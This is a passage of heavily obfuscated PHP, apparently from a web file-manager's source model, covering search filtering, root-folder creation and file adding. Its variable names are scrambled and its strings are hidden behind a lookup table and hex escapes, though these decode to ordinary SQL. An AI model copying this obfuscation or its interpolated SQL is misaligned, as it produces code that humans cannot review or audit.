array_unique($ªùÄíÏÂ); $this->_listSearchMerge($ „Ÿäô, $ìšíÍÅ, $â™Ü˜¨ö, $×’èû); } private function _listSearchDesc(&$¦„âÏ±˜, $§çÚ¾©Ÿ, $®¬÷’†Ü) { $çú¸¡¤È =& $_SERVER[Ó¡Ÿ§‚]; if (!$§çÚ¾©Ÿ[$çú¸¡¤È[1948]] || $¦„âÏ±˜[$çú¸¡¤È[366]][$çú¸¡¤È[353]] > 1) { return; } $×Ì’Ğêµ = array($çú¸¡¤È[94] => $çú¸¡¤È[462], $çú¸¡¤È[374] => array($çú¸¡¤È[383], $çú¸¡¤È[1950] . $§çÚ¾©Ÿ[$çú¸¡¤È[1948]] . $çú¸¡¤È[1950])); $ëŞÚğÉŒ = !1; if ($ëŞÚğÉŒ) { $Ääşìòå = $this->listSearchChildren($§çÚ¾©Ÿ[$çú¸¡¤È[441]]); $Ääşìòå = array_unique($Ääşìòå); if (!$Ääşìòå) { return; } $×Ì’Ğêµ[$çú¸¡¤È[411]] = array($çú¸¡¤È[7], $Ääşìòå); } $›İ°¤Ï = Model($çú¸¡¤È[569])->field($çú¸¡¤È[411])->where($×Ì’Ğêµ)->limit(5000)->select(); $×ô¸£×§ = array_to_keyvalue($›İ°¤Ï, $çú¸¡¤È[12], $çú¸¡¤È[411]); $this->_listSearchMerge($¦„âÏ±˜, $§çÚ¾©Ÿ, $®¬÷’†Ü, $×ô¸£×§); } private function _listSearchGroupTag(&$àƒ‚£¿, $¦²ûÔƒÂ, $ï¬³“ŒÌ) { $ÈËø¡É» =& $_SERVER[Ó¡Ÿ§‚]; if (!$¦²ûÔƒÂ[$ÈËø¡É»[1948]] || $àƒ‚£¿[$ÈËø¡É»[366]][$ÈËø¡É»[353]] > 1 || !$¦²ûÔƒÂ[$ÈËø¡É»[441]]) { return; } $†İô®õ = $this->sourceInfo($¦²ûÔƒÂ[$ÈËø¡É»[441]]); if (!$†İô®õ || $†İô®õ[$ÈËø¡É»[420]] != SourceModel::TYPE_GROUP) { return; } $Õîò±ü™ = $†İô®õ[$ÈËø¡É»[505]]; $­•ÓÔ›¼ = Model($ÈËø¡É»[2114])->get($Õîò±ü™); $§’»Ÿò¡ = array(); $„Ë¼‹· = $¦²ûÔƒÂ[$ÈËø¡É»[1948]]; foreach ($­•ÓÔ›¼[$ÈËø¡É»[369]] as $†ÁÈÉ™) { $µ«£îğ = $†ÁÈÉ™[$ÈËø¡É»[32]]; $Î’Š×óÉ = str_replace($ÈËø¡É»[53], $ÈËø¡É»[12], Pinyin::get($µ«£îğ)); if (stripos($µ«£îğ, $„Ë¼‹·) !== !1 || stripos($Î’Š×óÉ, $„Ë¼‹·) !== !1) { $§’»Ÿò¡[] = $†ÁÈÉ™[$ÈËø¡É»[399]]; } } if (!$§’»Ÿò¡) { return; } $Ü‰„ÑÒ£ = array($ÈËø¡É»[435] => array($ÈËø¡É»[7], $§’»Ÿò¡), $ÈËø¡É»[1665] => 0, $ÈËø¡É»[33] => $ÈËø¡É»[1970] . $Õîò±ü™); $„µè›û = Model($ÈËø¡É»[437])->field($ÈËø¡É»[84])->where($Ü‰„ÑÒ£)->select(); $„µè›û = array_to_keyvalue($„µè›û, $ÈËø¡É»[12], $ÈËø¡É»[84]); $úª›Ÿ¡ = array_unique($„µè›û); $this->_listSearchMerge($àƒ‚£¿, $¦²ûÔƒÂ, $ï¬³“ŒÌ, $úª›Ÿ¡); } private function _listSearchMerge(&$ÙÁ­œŒı, $éİòÁã›, $ı£í˜ƒ™, $¢…ƒˆÀ½) { $«±èãÖ‹ =& $_SERVER[Ó¡Ÿ§‚]; if (!$¢…ƒˆÀ½) { return; } $Ñùİ³“Ö = array_to_keyvalue($ÙÁ­œŒı[$«±èãÖ‹[369]], $«±èãÖ‹[12], $«±èãÖ‹[411]); $ÛÒÂß Á = array_diff($¢…ƒˆÀ½, $Ñùİ³“Ö); if (!$ÛÒÂß Á) { return; } $…½‘ÖÜ = array($«±èãÖ‹[411] => array($«±èãÖ‹[7], $ÛÒÂß Á)); $”Í£Ãá“ = $this->field($ı£í˜ƒ™)->where($…½‘ÖÜ)->select(); if (!$”Í£Ãá“) { return; } $´¥óŞšŸ = array(); foreach ($”Í£Ãá“ as $ôê‘…Ñî) { if ($this->_listSearchFilter($ôê‘…Ñî, $éİòÁã›)) { $´¥óŞšŸ[] = $ôê‘…Ñî; } } $ÙÁ­œŒı[$«±èãÖ‹[369]] = array_merge($´¥óŞšŸ, $ÙÁ­œŒı[$«±èãÖ‹[369]]); $ÙÁ­œŒı[$«±èãÖ‹[366]][$«±èãÖ‹[367]] += count($´¥óŞšŸ); } private function _listSearchFilter($áÊƒ§ŞÓ, $Û­· ç±) { $ÀŒëßçç =& $_SERVER[Ó¡Ÿ§‚]; $¥‰Ãí§½ = $áÊƒ§ŞÓ[$ÀŒëßçç[419]] == $ÀŒëßçç[88]; if (!strstr($áÊƒ§ŞÓ[$ÀŒëßçç[520]], $ÀŒëßçç[50] . $Û­· ç±[$ÀŒëßçç[441]] . $ÀŒëßçç[50])) { return !1; } if (isset($Û­· ç±[$ÀŒëßçç[421]]) && $Û­· ç±[$ÀŒëßçç[421]] != $ÀŒëßçç[1909]) { if ($Û­· ç±[$ÀŒëßçç[421]] == $ÀŒëßçç[75] && !$¥‰Ãí§½) { return !1; } if ($Û­· ç±[$ÀŒëßçç[421]] != $ÀŒëßçç[75] && $¥‰Ãí§½) { return !1; } if (!strstr($áÊƒ§ŞÓ[$ÀŒëßçç[174]], $ÀŒëßçç[50] . $Û­· ç±[$ÀŒëßçç[421]] . $ÀŒëßçç[50])) { return !1; } } if (isset($Û­· ç±[$ÀŒëßçç[2115]]) && $Û­· ç±[$ÀŒëßçç[2115]] < $áÊƒ§ŞÓ[$ÀŒëßçç[76]]) { return !1; } if (isset($Û­· ç±[$ÀŒëßçç[2116]]) && $Û­· ç±[$ÀŒëßçç[2116]] > $áÊƒ§ŞÓ[$ÀŒëßçç[76]]) { return !1; } if (isset($Û­· ç±[$ÀŒëßçç[599]]) && $Û­· ç±[$ÀŒëßçç[599]] != $áÊƒ§ŞÓ[$ÀŒëßçç[465]]) { return !1; } return !0; } public function listSearchChildren($¿­÷—ö, $÷ëÎÖ™ = 5000) { $–ö‡à  =& $_SERVER[Ó¡Ÿ§‚]; $îÊáıÂù = array(); $û”âşÉ  = $this->sourceInfo($¿­÷—ö); $ÛÂÛ†— = array($–ö‡à [520] => array($–ö‡à [383], $û”âşÉ [$–ö‡à [520]] . $û”âşÉ [$–ö‡à [411]] . $–ö‡à [550])); $ôïœÀ§‹ = $this->field($–ö‡à [76])->where($ÛÂÛ†—)->limit($÷ëÎÖ™ + 1)->select(); $ƒÀó˜ËÆ = is_array($ôïœÀ§‹) ? count($ôïœÀ§‹) : 0; if ($ƒÀó˜ËÆ > $÷ëÎÖ™) { return $this->_listSearchChildrenNear($¿­÷—ö, $÷ëÎÖ™); } $·‚ö…¬£ = $this->field($–ö‡à [411])->where($ÛÂÛ†—)->select(); $îÊáıÂù = array_to_keyvalue($·‚ö…¬£, $–ö‡à [12], $–ö‡à [411]); return $îÊáıÂù; } private function _listSearchChildrenNear($§¾¨¹¦ç, $ó§ÁÑ‹) { $“ˆª¿¬õ =& $_SERVER[Ó¡Ÿ§‚]; $Á¦â¤âø = array(); $ûÉÇêõ… = array($“ˆª¿¬õ[441] => $§¾¨¹¦ç); $´ÏË• = $this->field($“ˆª¿¬õ[2117])->where($ûÉÇêõ…)->select(); $êÉã¦¡ƒ = array_to_keyvalue(array_filter_by_field($´ÏË•, $“ˆª¿¬õ[419], $“ˆª¿¬õ[88]), $“ˆª¿¬õ[12], $“ˆª¿¬õ[411]); $Á¦â¤âø = array_merge($Á¦â¤âø, array_to_keyvalue($´ÏË•, $“ˆª¿¬õ[12], $“ˆª¿¬õ[411])); if (!$êÉã¦¡ƒ) { return $Á¦â¤âø; } $ûÉÇêõ… = array($“ˆª¿¬õ[441] => array($“ˆª¿¬õ[7], $êÉã¦¡ƒ)); $´ÏË• = $this->field($“ˆª¿¬õ[2117])->where($ûÉÇêõ…)->limit($ó§ÁÑ‹)->select(); $Á¦â¤âø = array_merge($Á¦â¤âø, array_to_keyvalue($´ÏË•, $“ˆª¿¬õ[12], $“ˆª¿¬õ[411])); $Á¦â¤âø = array_slice($Á¦â¤âø, 0, $ó§ÁÑ‹); return $Á¦â¤âø; } private function _listSearchBindPinyin($Êæ»™Ã, &$º‚Ö½™ó, &$şôÍÎš§) { $üö•‡µò =& $_SERVER[Ó¡Ÿ§‚]; if (!isset($Êæ»™Ã[$üö•‡µò[1948]]) || !$Êæ»™Ã[$üö•‡µò[1948]]) { return; } if (!Input::check($Êæ»™Ã[$üö•‡µò[1948]], $üö•‡µò[318]) || strlen($Êæ»™Ã[$üö•‡µò[1948]]) < 2) { return; } $ªÜı±ô = "\114\105\106\124\40\x4a\117\x49\x4e\40{$this->tablePrefix}\151\157\x5f\163\157\165\x72\143\145\x5f\x6d\145\x74\141\x20\155\x65\164\141\x20\157\156\40\x73\x6f\165\162\x63\x65\x2e\163\157\165\x72\143\x65\111\104\40\75\40\155\145\x74\141\56\163\157\x75\162\143\145\x49\x44"; $ÌÚû¯ìö = array(); $şôÍÎš§ = str_replace(array($üö•‡µò[231], $üö•‡µò[53], $üö•‡µò[2118]), $üö•‡µò[12], $şôÍÎš§); $şôÍÎš§ = $üö•‡µò[447] . str_replace($üö•‡µò[50], $üö•‡µò[448], $şôÍÎš§); $ôÃæŞ•Ï = $º‚Ö½™ó[$üö•‡µò[32]]; unset($º‚Ö½™ó[$üö•‡µò[32]]); foreach ($º‚Ö½™ó as $Ó•Á÷è‡ => $ó¤ÖÉÒ€) { $ÌÚû¯ìö[$üö•‡µò[447] . $Ó•Á÷è‡] = $ó¤ÖÉÒ€; } foreach ($ôÃæŞ•Ï as $›˜ÌÂ´) { $ÌÚû¯ìö[] = array($üö•‡µò[452] => $›˜ÌÂ´, $üö•‡µò[999] => $üö•‡µò[1952], array($üö•‡µò[2119] => $›˜ÌÂ´, $üö•‡µò[2120] => array($üö•‡µò[7], array($üö•‡µò[474], $üö•‡µò[473])))); } $this->join($ªÜı±ô); $º‚Ö½™ó = $ÌÚû¯ìö; } private function _parseSearchWhere($ÒÚØ˜ãŠ) { $²ÀŒÕé =& $_SERVER[Ó¡Ÿ§‚]; $ûÇ¬ò² = array(); if (isset($ÒÚØ˜ãŠ[$²ÀŒÕé[759]]) && $ÒÚØ˜ãŠ[$²ÀŒÕé[759]]) { $ûÇ¬ò²[$²ÀŒÕé[85]] = array($²ÀŒÕé[2121], $ÒÚØ˜ãŠ[$²ÀŒÕé[759]]); } if (isset($ÒÚØ˜ãŠ[$²ÀŒÕé[760]]) && $ÒÚØ˜ãŠ[$²ÀŒÕé[760]]) { $µ¼¹Á»¿ = array($²ÀŒÕé[2122], $ÒÚØ˜ãŠ[$²ÀŒÕé[760]]); if ($ûÇ¬ò²[$²ÀŒÕé[85]]) { $ûÇ¬ò²[$²ÀŒÕé[85]] = array($ûÇ¬ò²[$²ÀŒÕé[85]], $µ¼¹Á»¿, $²ÀŒÕé[2123]); } else { $ûÇ¬ò²[$²ÀŒÕé[85]] = $µ¼¹Á»¿; } } if (isset($ÒÚØ˜ãŠ[$²ÀŒÕé[2115]]) && $ÒÚØ˜ãŠ[$²ÀŒÕé[2115]] > 0) { $ûÇ¬ò²[$²ÀŒÕé[76]] = array($²ÀŒÕé[2121], $ÒÚØ˜ãŠ[$²ÀŒÕé[2115]]); } if (isset($ÒÚØ˜ãŠ[$²ÀŒÕé[2116]]) && $ÒÚØ˜ãŠ[$²ÀŒÕé[2116]]) { $µ¼¹Á»¿ = array($²ÀŒÕé[2122], $ÒÚØ˜ãŠ[$²ÀŒÕé[2116]]); if ($ûÇ¬ò²[$²ÀŒÕé[76]]) { $ûÇ¬ò²[$²ÀŒÕé[76]] = array($ûÇ¬ò²[$²ÀŒÕé[76]], $µ¼¹Á»¿, $²ÀŒÕé[2123]); } else { $ûÇ¬ò²[$²ÀŒÕé[76]] = $µ¼¹Á»¿; } } if (isset($ÒÚØ˜ãŠ[$²ÀŒÕé[599]]) && $ÒÚØ˜ãŠ[$²ÀŒÕé[599]]) { $ûÇ¬ò²[] = array($²ÀŒÕé[465] => $ÒÚØ˜ãŠ[$²ÀŒÕé[599]], $²ÀŒÕé[463] => $ÒÚØ˜ãŠ[$²ÀŒÕé[599]], $²ÀŒÕé[999] => $²ÀŒÕé[1952]); } if (isset($ÒÚØ˜ãŠ[$²ÀŒÕé[421]]) && $ÒÚØ˜ãŠ[$²ÀŒÕé[421]]) { $¦¢öüìÙ = $ÒÚØ˜ãŠ[$²ÀŒÕé[421]]; if ($¦¢öüìÙ == $²ÀŒÕé[75]) { $ûÇ¬ò²[$²ÀŒÕé[419]] = 1; } else { if ($¦¢öüìÙ == $²ÀŒÕé[2124]) { $ûÇ¬ò²[$²ÀŒÕé[419]] = 0; } else { if ($¦¢öüìÙ) { $¦¢öüìÙ = is_array($¦¢öüìÙ) ? $¦¢öüìÙ : explode($²ÀŒÕé[50], $¦¢öüìÙ); $ûÇ¬ò²[$²ÀŒÕé[421]] = array($²ÀŒÕé[427], $¦¢öüìÙ); $ûÇ¬ò²[$²ÀŒÕé[419]] = 0; } } } } $this->_parseSearchParent($ÒÚØ˜ãŠ, $ûÇ¬ò²); if (isset($ÒÚØ˜ãŠ[$²ÀŒÕé[1948]]) && trim($ÒÚØ˜ãŠ[$²ÀŒÕé[1948]])) { $º–ˆ¥ = trim($ÒÚØ˜ãŠ[$²ÀŒÕé[1948]]); $Èš«ÊÙ’ = explode($²ÀŒÕé[53], $º–ˆ¥); if (strlen($º–ˆ¥) > 2 && (substr($º–ˆ¥, 0, 1) == $²ÀŒÕé[118] && substr($º–ˆ¥, -1) == $²ÀŒÕé[118]) || substr($º–ˆ¥, 0, 1) == $²ÀŒÕé[58] && substr($º–ˆ¥, -1) == $²ÀŒÕé[58]) { $º–ˆ¥ = substr($º–ˆ¥, 1, -1); $Èš«ÊÙ’ = array($º–ˆ¥); } $ûÇ¬ò²[$²ÀŒÕé[32]] = array(array($²ÀŒÕé[549], $²ÀŒÕé[1950] . $º–ˆ¥ . $²ÀŒÕé[1950])); if (count($Èš«ÊÙ’) > 1) { $ûÇ¬ò²[$²ÀŒÕé[32]] = array(); foreach ($Èš«ÊÙ’ as $Î˜¯ãÃ²) { if (!trim($Î˜¯ãÃ²)) { continue; } $ûÇ¬ò²[$²ÀŒÕé[32]][] = array($²ÀŒÕé[549], $²ÀŒÕé[1950] . trim($Î˜¯ãÃ²) . $²ÀŒÕé[1950]); } } } return $ûÇ¬ò²; } private function _parseSearchParent($—†¾õ°Õ, &$ÃÌËÌè•) { $™´ÂÄïŠ =& $_SERVER[Ó¡Ÿ§‚]; if (!isset($—†¾õ°Õ[$™´ÂÄïŠ[441]]) || !$—†¾õ°Õ[$™´ÂÄïŠ[441]]) { return; } $şÖ·Š¨é = $this->pathInfo($—†¾õ°Õ[$™´ÂÄïŠ[441]]); $¨ˆ°´ò = $şÖ·Š¨é[$™´ÂÄïŠ[441]] . $™´ÂÄïŠ[12] === $™´ÂÄïŠ[198]; $¤†î•ë¨ = $şÖ·Š¨é[$™´ÂÄïŠ[420]] == $™´ÂÄïŠ[514]; if ($şÖ·Š¨é[$™´ÂÄïŠ[531]] == $™´ÂÄïŠ[532]) { $ÁåÕÂº¬ = $this->sourceInfo($—†¾õ°Õ[$™´ÂÄïŠ[441]]); $şÖ·Š¨é[$™´ÂÄïŠ[520]] = $ÁåÕÂº¬[$™´ÂÄïŠ[520]]; } $ÃÌËÌè•[$™´ÂÄïŠ[589]] = array($™´ÂÄïŠ[549], $şÖ·Š¨é[$™´ÂÄïŠ[520]] . $—†¾õ°Õ[$™´ÂÄïŠ[441]] . $™´ÂÄïŠ[550]); $ÁàÄªÌÁ = isset($—†¾õ°Õ[$™´ÂÄïŠ[1813]]) && in_array($™´ÂÄïŠ[514], $—†¾õ°Õ[$™´ÂÄïŠ[1813]]); if (!$ÁàÄªÌÁ || !$¤†î•ë¨ || !$¨ˆ°´ò || !$şÖ·Š¨é[$™´ÂÄïŠ[422]]) { return; } if (!AuthModel::authCheckRoot($şÖ·Š¨é[$™´ÂÄïŠ[422]][$™´ÂÄïŠ[423]])) { return; } $çáîäµ¬ = $şÖ·Š¨é[$™´ÂÄïŠ[505]] . $™´ÂÄïŠ[12]; if ($çáîäµ¬ == $™´ÂÄïŠ[88]) { unset($ÃÌËÌè•[$™´ÂÄïŠ[589]]); $ÃÌËÌè•[$™´ÂÄïŠ[420]] = self::TYPE_GROUP; return; } $ˆßâîÉĞ = Model($™´ÂÄïŠ[521])->groupChildrenAll($çáîäµ¬); $˜É·¶²ş = count($ˆßâîÉĞ); if ($˜É·¶²ş <= 1) { return; } $ÈÑ•ßõŸ = array($™´ÂÄïŠ[441] => 0, $™´ÂÄïŠ[420] => self::TYPE_GROUP, $™´ÂÄïŠ[505] => array($™´ÂÄïŠ[7], $ˆßâîÉĞ)); $’´­–ÏÕ = $this->field($™´ÂÄïŠ[2125])->where($ÈÑ•ßõŸ)->limit($˜É·¶²ş)->select(); $ÃÌËÌè•[$™´ÂÄïŠ[589]] = array(); foreach ($’´­–ÏÕ as $¢ø¦ä) { $ÃÌËÌè•[$™´ÂÄïŠ[589]][] = array($™´ÂÄïŠ[549], $™´ÂÄïŠ[530] . $¢ø¦ä[$™´ÂÄïŠ[411]] . $™´ÂÄïŠ[550]); } $ÃÌËÌè•[$™´ÂÄïŠ[589]][] = $™´ÂÄïŠ[1952]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ƒø´îÀá) { $İ¦ü³‹ =& $_SERVER[Ó¡Ÿ§‚]; $›À½ƒ… = Model($İ¦ü³‹[513])->where(array($İ¦ü³‹[1656] => $ƒø´îÀá))->find(); $¸Ñ¦Ë® = $this->_mkdirRoot(SourceModel::TYPE_USER, $ƒø´îÀá, $›À½ƒ…[$İ¦ü³‹[32]]); $this->userDesktopAdd($¸Ñ¦Ë®); return $¸Ñ¦Ë®; } public function userDesktopAdd($Ğ‡û˜ƒ£) { $íæÒµ£³ =& $_SERVER[Ó¡Ÿ§‚]; $Ò˜›°ı¢ = LNG($íæÒµ£³[2126]); $é«ŸÎ…ş = $this->mkdir($Ğ‡û˜ƒ£, $Ò˜›°ı¢); $this->metaSet($é«ŸÎ…ş, $íæÒµ£³[2127], $íæÒµ£³[88]); $this->metaSet($Ğ‡û˜ƒ£, $íæÒµ£³[2128], $é«ŸÎ…ş); } public function userPathSafeAdd($÷öª´åš) { $ˆø¹¬È =& $_SERVER[Ó¡Ÿ§‚]; $¶ŠÌÌï = Model($ˆø¹¬È[513])->getInfoFull($÷öª´åš); if (!$¶ŠÌÌï) { return !1; } if (_get($¶ŠÌÌï, $ˆø¹¬È[535])) { return $¶ŠÌÌï[$ˆø¹¬È[475]][$ˆø¹¬È[2129]]; } $ıÈàÅ„‰ = $this->_mkdirRoot(SourceModel::TYPE_USER, $÷öª´åš, $ˆø¹¬È[2130], $ˆø¹¬È[442]); Model($ˆø¹¬È[513])->metaSet($÷öª´åš, $ˆø¹¬È[2129], $ıÈàÅ„‰); $this->metaSet($ıÈàÅ„‰, $ˆø¹¬È[2131], $÷öª´åš); return $ıÈàÅ„‰; } public function groupRootAdd($³Ê««™) { $—ÃæĞ® =& $_SERVER[Ó¡Ÿ§‚]; $‚âÏÒ û = Model($—ÃæĞ®[521])->where(array($—ÃæĞ®[1942] => $³Ê««™))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $³Ê««™, $‚âÏÒ û[$—ÃæĞ®[32]]); } public function systemRootPathAdd($¬áÀ…îÃ) { if ($¬áÀ…îÃ != $_SERVER[Ó¡Ÿ§‚][543]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $¬áÀ…îÃ); } public function userRootRemove($Ì›Ôàî) { $„ìŸôÈ = $this->targetSourceRoot(SourceModel::TYPE_USER, $Ì›Ôàî, !0); foreach ($„ìŸôÈ as $£¼•ãşñ) { if (!$£¼•ãşñ) { continue; } $this->remove($£¼•ãşñ[$_SERVER[Ó¡Ÿ§‚][411]], !1); } } public function groupRootRemove($Õ×æÂ‚”) { $Ó‹¹¢äã = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Õ×æÂ‚”); if (!$Ó‹¹¢äã) { return; } $this->remove($Ó‹¹¢äã[$_SERVER[Ó¡Ÿ§‚][411]], !1); } private function _mkdirRoot($£Í“ÕÙì, $´˜¬©‹, $Îİ«ù„›, $ÜàÖ¢…‘ = '') { $Ä¨¢ïÁŒ =& $_SERVER[Ó¡Ÿ§‚]; $Õ¢Ó”‹ = array($Ä¨¢ïÁŒ[410] => 0, $Ä¨¢ïÁŒ[585] => $£Í“ÕÙì, $Ä¨¢ïÁŒ[586] => $´˜¬©‹, $Ä¨¢ïÁŒ[583] => 1, $Ä¨¢ïÁŒ[587] => USER_ID, $Ä¨¢ïÁŒ[588] => USER_ID, $Ä¨¢ïÁŒ[584] => $ÜàÖ¢…‘, $Ä¨¢ïÁŒ[589] => $Ä¨¢ïÁŒ[530], $Ä¨¢ïÁŒ[439] => 0, $Ä¨¢ïÁŒ[554] => 0, $Ä¨¢ïÁŒ[478] => 0, $Ä¨¢ïÁŒ[590] => $Ä¨¢ïÁŒ[12]); if ($¤¾˜Áµö = $this->where($Õ¢Ó”‹)->find()) { return $¤¾˜Áµö[$Ä¨¢ïÁŒ[411]]; } $ä¨Ÿ¯Ã¢ = "\x4d\157\144\145\x6c\123\x6f\x75\x72\143\x65\56\x6d\153\x64\151\x72\122\x6f\157\x74\56{$£Í“ÕÙì}\x2e{$´˜¬©‹}\x2e" . $Îİ«ù„›; CacheLock::lock($ä¨Ÿ¯Ã¢); $Õ¢Ó”‹[$Ä¨¢ïÁŒ[32]] = $Îİ«ù„›; $‰­ŞÆÎâ = $this->add($Õ¢Ó”‹); $ÁÌãˆ¡» = array($Ä¨¢ïÁŒ[591] => short_id($‰­ŞÆÎâ)); $this->where(array($Ä¨¢ïÁŒ[426] => $‰­ŞÆÎâ))->save($ÁÌãˆ¡»); CacheLock::unlock($ä¨Ÿ¯Ã¢); return $‰­ŞÆÎâ; } private function targetSourceRoot($§Ü÷Å»½, $Ùø”“…š, $¿ş°Ø¸Å = false) { $Ü×ÚÈØ° =& $_SERVER[Ó¡Ÿ§‚]; $Ş•ÁÂ÷ = array($Ü×ÚÈØ°[410] => 0, $Ü×ÚÈØ°[585] => $§Ü÷Å»½, $Ü×ÚÈØ°[586] => $Ùø”“…š); if ($¿ş°Ø¸Å) { $íÇŠµŞ” = $this->where($Ş•ÁÂ÷)->select(); return $íÇŠµŞ” ? $íÇŠµŞ” : array(); } $ª–İÂ¤ = $this->where($Ş•ÁÂ÷)->find(); return $ª–İÂ¤ ? $ª–İÂ¤ : array(); } public function sourceRootGroup($Äùë·Ü¸) { $ä€˜ûÔ =& $_SERVER[Ó¡Ÿ§‚]; if (is_string($Äùë·Ü¸)) { $Äùë·Ü¸ = array($Äùë·Ü¸); } $íÍñçœ¸ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $Äùë·Ü¸, $ä€˜ûÔ[189]); $«èµ˜‹ˆ = array($ä€˜ûÔ[369] => $íÍñçœ¸, $ä€˜ûÔ[366] => array($ä€˜ûÔ[757] => count($Äùë·Ü¸))); $this->_listDataApply($«èµ˜‹ˆ[$ä€˜ûÔ[369]]); $this->_listMake($«èµ˜‹ˆ); return array_to_keyvalue($«èµ˜‹ˆ[$ä€˜ûÔ[82]], $ä€˜ûÔ[505]); } public function mkfile($º†Ğ†ß, $á±«€ß†, $‹Œı¿ˆÃ = '', $Û™âòú = REPEAT_RENAME) { $®˜ÈÑÂ¿ =& $_SERVER[Ó¡Ÿ§‚]; $çŞƒ¼·â = Model($®˜ÈÑÂ¿[610])->addFileByContent($‹Œı¿ˆÃ, $á±«€ß†); return $this->_createFileCall($º†Ğ†ß, $á±«€ß†, $çŞƒ¼·â, $Û™âòú, $®˜ÈÑÂ¿[1349]); } public function addFile($Œş€÷ñÛ, $şş’Ìâ­, $£”¢øéÜ, $˜ÅÖêŒ™ = false, $¬•ç¹à = REPEAT_RENAME) { $Ü‚ˆœÓ = Model($_SERVER[Ó¡Ÿ§‚][610])->addFile($şş’Ìâ­, $£”¢øéÜ, $˜ÅÖêŒ™); return $this->_createFileCall($Œş€÷ñÛ, $£”¢øéÜ, $Ü‚ˆœÓ, $¬•ç¹à); } public function addFileByFileID($Õµ¯æ¹…, $ —¼òó§, $øú‘œÏ’, $´î¨¡ÕÅ = REPEAT_RENAME) { $¤¡ë¹³¾ =& $_SERVER[Ó¡Ÿ§‚]; $²¶î´Ş = Model($¤¡ë¹³¾[610])->find($ —¼òó§); Model($¤¡ë¹³¾[610])->linkAdd($ —¼òó§); return $this->_createFileCall($Õµ¯æ¹…, $øú‘œÏ’, $²¶î´Ş, $´î¨¡ÕÅ); } public function addFileByRemote($’–ôáäö, $ÉÀ®Õ±Œ, $İ‰Ê¨œ‚, $çê©—ß· = array(), $å×‰Ïî¯ = REPEAT_RENAME) { $áôÙ™÷• = Model($_SERVER[Ó¡Ÿ§‚][610])->addFileByRemote($ÉÀ®Õ±Œ, $İ‰Ê¨œ‚, $çê©—ß·); return $this->_createFileCall($’–ôáäö, $İ‰Ê¨œ‚, $áôÙ™÷•, $å×‰Ïî¯); } private function _createFileCall($Â™ØÕ‚, $—é±•Å, $ìëøÔüò, $¸äİŒà, $›„ÅØ¤ = "\165\160\154\x6f\141\x64") { $™¤æ²±â =& $_SERVER[Ó¡Ÿ§‚]; $‰ÜáıŞ… = !1; $this->setMasterDB(); $this->lockWriteStart($Â™ØÕ‚, $—é±•Å); $½Å¥Ğ’ = $this->fileNameExist($Â™ØÕ‚, $—é±•Å); $Öø¾’šé = $this->_createFile($Â™ØÕ‚, $—é±•Å, $ìëøÔüò, $¸äİŒà, $‰ÜáıŞ…); if (!$‰ÜáıŞ…) { Model($™¤æ²±â[480])->remove($ìëøÔüò[$™¤æ²±â[477]]); } if ($‰ÜáıŞ… && $Öø¾’šé && $Öø¾’šé != $½Å¥Ğ’) { Model($™¤æ²±â[2099])->eventCreate($Öø¾’šé, $›„ÅØ¤); } $this->lockWriteEnd($Â™ØÕ‚, $—é±•Å); return $Öø¾’šé; } public function mkdir($ææñò¼±, $™êŸÀş, $Êµ‰–ë = REPEAT_SKIP) { $±¾ËòÑĞ =& $_SERVER[Ó¡Ÿ§‚]; $this->setMasterDB(); $’¢ùğèç = $this->sourceInfo($ææñò¼±); if (!$’¢ùğèç) { return !1; } $this->lockWriteStart($ææñò¼±, $™êŸÀş); if ($Êµ‰–ë !== !1) { $Œ…åª¯Ä = $this->fileNameExist($ææñò¼±, $™êŸÀş); if ($Œ…åª¯Ä && $Êµ‰–ë != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ææñò¼±, $™êŸÀş); return $Œ…åª¯Ä; } $™êŸÀş = $this->fileNameAuto($ææñò¼±, $™êŸÀş, $Êµ‰–ë); } $Ü¢‹Ó¥Ó = array($±¾ËòÑĞ[583] => 1, $±¾ËòÑĞ[429] => $™êŸÀş, $±¾ËòÑĞ[584] => $±¾ËòÑĞ[12], $±¾ËòÑĞ[478] => 0, $±¾ËòÑĞ[554] => 0); $Ä›‰´Îö = $this->_addSource($Ü¢‹Ó¥Ó, $’¢ùğèç); Model($±¾ËòÑĞ[2099])->eventCreate($Ä›‰´Îö, $±¾ËòÑĞ[1350]); $this->lockWriteEnd($ææñò¼±, $™êŸÀş); return $Ä›‰´Îö; } public function listSourceRoot($Üªæ©‰, $Ó±êŒÄ¡, $Û ÏÕøö = "\163\x6f\165\162\x63\x65\x49\x44\x2c\164\141\162\147\x65\164\111\x44\54\163\x69\x7a\145") { $ éü‰ı =& $_SERVER[Ó¡Ÿ§‚]; $‹ôí¹ƒ• = $ éü‰ı[378]; $¤á”×¦Ô = array(); $„ğ£­ç = 1024 * 50; $±©ÁÆ™” = is_array($±©ÁÆ™”) ? $±©ÁÆ™” : array(); $ø™èÙ¥­ = count($Ó±êŒÄ¡); $ì´ôÅ¤Ñ = $this->tablePrefix . $ éü‰ı[2132]; for ($Ëé·áÁ³ = 0; $Ëé·áÁ³ < $ø™èÙ¥­; $Ëé·áÁ³++) { $‹·ë®§¬ = $Ó±êŒÄ¡[$Ëé·áÁ³]; $‹ôí¹ƒ• .= "\x53\x45\114\x45\103\124\x20\x2a\x20\x46\122\x4f\x4d\x20\50\x53\x45\114\x45\103\124\40{$Û ÏÕøö}\x20\x46\122\x4f\x4d\40\x60{$ì´ôÅ¤Ñ}\140\x20\127\x48\x45\x52\x45\40"; $‹ôí¹ƒ• .= "\x60\x70\141\x72\145\x6e\x74\111\x44\x60\x3d\60\40\101\x4e\104\x20\x60\164\141\x72\x67\x65\x74\x49\104\140\75{$‹·ë®§¬}\40\101\x4e\104\40\140\x74\141\162\x67\x65\164\124\x79\x70\145\x60\75{$Üªæ©‰}\40\x61\x6e\x64\x20\146\151\x6c\145\x54\x79\160\145\x3d\x27\47\x20\154\x69\x6d\151\x74\40\x31\x29\x20\x61\163\40\164\x62\x5f{$Ëé·áÁ³}\x20\x55\116\x49\117\116\x20\x41\114\114\x20"; if ((strlen($‹ôí¹ƒ•) >= $„ğ£­ç || $Ëé·áÁ³ == $ø™èÙ¥­ - 1) && $‹ôí¹ƒ•) { $‹ôí¹ƒ• = substr($‹ôí¹ƒ•, 0, -strlen($ éü‰ı[1037])); $¯ÙÙ¤¡› = $this->query($‹ôí¹ƒ•); $‹ôí¹ƒ• 